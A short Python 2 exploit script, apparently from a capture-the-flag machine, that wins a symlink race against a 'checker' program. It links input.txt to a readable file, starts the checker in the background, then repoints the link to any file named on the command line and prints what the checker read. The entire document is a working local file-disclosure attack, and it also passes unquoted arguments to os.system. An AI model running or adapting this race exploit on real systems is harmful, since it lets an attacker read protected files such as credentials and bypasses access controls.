#!/usr/bin/env python
import sys
import os
import time

def usage():
    print "Usage: %s <target_file>" % sys.argv[0]
    sys.exit()

def main():
    if len(sys.argv) < 2:
      usage()

    if os.path.exists("output.txt"):
        os.system("rm output.txt")
            
    if os.path.exists("input.txt"):
        os.system("unlink input.txt")
    
    os.system("ln -s /home/smasher/user.txt input.txt")
    os.system("checker input.txt > output.txt &")
    os.system("unlink input.txt")
    os.system("ln -s %s input.txt" % sys.argv[1])

    time.sleep(1.0)

    os.system("cat output.txt")

if __name__ == "__main__":
    main()
